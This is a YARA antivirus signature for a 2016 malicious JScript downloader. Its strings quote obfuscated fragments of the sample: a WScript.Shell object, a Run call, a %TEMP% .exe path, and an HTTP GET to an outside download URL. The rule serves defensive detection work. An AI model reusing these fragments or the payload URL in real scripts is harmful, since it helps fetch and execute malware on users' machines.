rule sig_20160328_7547da33c5708b43340a261797d5dc62 {
  meta:
    description = "datamaliciousorder - file 20160328_7547da33c5708b43340a261797d5dc62.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "96210c5c27d184f2fc5a47fa1ed98811e1d25a5c88f09ee187cc1726bec3d7a4"

  strings:
    $s1  = "function Dmqgtznodo() {return Guufz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"CoDokDM8lZXMUez.exe\";};" fullword ascii
    $s2  = "Lxnzgllri[Oyfbiutpta](\"GET\", \"http://finnskogen-oppvekstsenter.com/o4paka\", false);" fullword ascii
    $s3  = "do {WScript[Vlzstqnxo](Vhehyasls() * 11)} while (Lxnzgllri[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Uokymhwnhl(Ifpdt, Inwfifymo){return Ifpdt - Inwfifymo;};" fullword ascii
    $s5  = "var Guufz = function Chlvr() {return WScript[Qcdkmaajoz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Wqkerage(Xirtqjh){Guufz[\"Run\"](Xirtqjh, Ferrghowu, Ferrghowu);};" fullword ascii
    $s7  = "function Mckhmekqqy() {return ((Yjajydl == true) && (Yjajydl == Gcdxjrfdd)) ? 1 : Ferrghowu;};" fullword ascii
    $s8  = "var Yjajydl = false;" fullword ascii
    $s9  = "function Vhehyasls(){return 22;};" fullword ascii
    $s10 = "var Gcdxjrfdd = false;" fullword ascii
    $s11 = "function Vhwbdtloi()" fullword ascii
    $s12 = "Gcdxjrfdd = true; " fullword ascii
    $s13 = "function Rdcsdh(Fjzobk) {var Axsfrga = (1, 2, 3, 4, 5, Fjzobk); return Axsfrga;};" fullword ascii
    $s14 = "Yjajydl = true; " fullword ascii
    $s15 = "var Zvxvmg = false;" fullword ascii
    $s16 = " while (Xhiycvqmm){" fullword ascii
    $s17 = "function Pokdozrh(){return Uqjuim;};" fullword ascii
    $s18 = "return Uokymhwnhl(Hinwax, Komwa);" fullword ascii
    $s19 = "var Eklhdeiuq = new this[\"Date\"]();" fullword ascii
    $s20 = "function Yjwaweife(){return Qcdkmaajoz;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}